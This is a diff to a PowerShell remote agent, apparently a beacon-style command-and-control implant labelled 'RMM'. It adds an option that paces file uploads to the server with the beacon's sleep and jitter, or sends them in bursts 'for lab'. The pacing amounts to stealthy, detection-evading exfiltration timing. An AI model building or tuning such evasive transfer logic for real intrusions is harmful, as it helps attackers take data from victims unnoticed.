@@ -35,6 +35,10 @@
 #   $httpProxyUseDefaultCredentials
 #                       $true = use Windows logon for proxy authentication (NTLM/Kerberos).
 #
+# Download transfer (agent → server file_upload chunks)
+#   $downloadBurst       $false = pace each chunk like the beacon (sleep + jitter between POSTs).
+#                       $true  = send all chunks back-to-back (throughput / lab only).
+#
 # Diagnostics
 #   $verboseHttp         $true = log each request URL, wire IPv4, status, and error bodies.
 #
@@ -51,6 +55,7 @@ $jitterPercent = 30
 $maxRetries = 3
 
 $persistentHttp = $false
+$downloadBurst = $false
 $httpProxy = ''
 $httpProxyUseDefaultCredentials = $false
 
@@ -74,6 +79,9 @@ if ($env:RMM_VERBOSE -and $env:RMM_VERBOSE.Trim() -match '^(?i)(1|true|yes|on)$'
 if ($env:RMM_PERSISTENT_HTTP -and $env:RMM_PERSISTENT_HTTP.Trim().Length -gt 0) {
     $persistentHttp = $env:RMM_PERSISTENT_HTTP.Trim() -match '^(?i)(1|true|yes|on)$'
 }
+if ($env:RMM_DOWNLOAD_BURST -and $env:RMM_DOWNLOAD_BURST.Trim().Length -gt 0) {
+    $downloadBurst = $env:RMM_DOWNLOAD_BURST.Trim() -match '^(?i)(1|true|yes|on)$'
+}
 if ($env:RMM_HTTP_PROXY -and $env:RMM_HTTP_PROXY.Trim().Length -gt 0) {
     $httpProxy = $env:RMM_HTTP_PROXY.Trim()
 }
@@ -96,6 +104,7 @@ $currentRetry = 0
 $script:RmmEverRegistered = $false
 $script:RmmVerbose = [bool]$verboseHttp
 $script:UsePersistentHttp = [bool]$persistentHttp
+$script:DownloadBurst = [bool]$downloadBurst
 $script:RmmShellCwd = (Get-Location).Path
 if (-not ('RmmHostAnchor' -as [type])) {
     Add-Type -TypeDefinition @'
@@ -527,7 +536,8 @@ function Invoke-RmmRestMethod {
 function Get-JitteredSleep {
     param(
         [int]$baseSeconds,
-        [int]$jitterPercent
+        [int]$jitterPercent,
+        [switch]$Quiet
     )
     
     # Calculate jitter range
@@ -539,11 +549,18 @@ function Get-JitteredSleep {
     $microJitter = Get-Random -Minimum 100 -Maximum 1000
     $totalMilliseconds = ($actualSleep * 1000) + $microJitter
     
-    Write-Host "[*] Sleeping for $actualSleep.$microJitter seconds (base: $baseSeconds, jitter: $jitterValue sec, micro: $microJitter ms)" -ForegroundColor DarkGray
+    if (-not $Quiet) {
+        Write-Host "[*] Sleeping for $actualSleep.$microJitter seconds (base: $baseSeconds, jitter: $jitterValue sec, micro: $microJitter ms)" -ForegroundColor DarkGray
+    }
     
     # Sleep using milliseconds only
     Start-Sleep -Milliseconds $totalMilliseconds
     return $actualSleep
+}
+
+function Wait-RmmDownloadChunkPace {
+    if ($script:DownloadBurst) { return }
+    $null = Get-JitteredSleep -baseSeconds $script:baseSleepSeconds -jitterPercent $script:jitterPercent -Quiet
 }
 
 # Exponential backoff for retries
@@ -1471,6 +1488,7 @@ function Send-RmmFileDownload {
             Send-RmmDownloadProgressIfChanged -RemotePath $RemotePath -Headers $Headers -Bytes $offset `
                 -TotalBytes $fileLen -Speed $speed -Eta $eta -LastSentPct ([ref]$lastSentPct) -LastSentAt ([ref]$lastSentAt)
             if ($eof) { break }
+            Wait-RmmDownloadChunkPace
         }
     } finally {
         $fs.Dispose()
@@ -2439,6 +2457,11 @@ if ($script:UsePersistentHttp) {
     Write-Host "[*] HTTP: persistent cookies + TCP keep-alive, IPv4-only" -ForegroundColor DarkGray
 } else {
     Write-Host "[*] HTTP: IPv4-only, KeepAlive=false (set `$persistentHttp = `$true for persistent TCP)" -ForegroundColor DarkGray
+}
+if ($script:DownloadBurst) {
+    Write-Host "[*] Download: burst mode (back-to-back chunk POSTs)" -ForegroundColor DarkGray
+} else {
+    Write-Host "[*] Download: paced like beacon (sleep+jitter between chunk POSTs; set `$downloadBurst = `$true for burst)" -ForegroundColor DarkGray
 }
 
 while (-not $registered) {
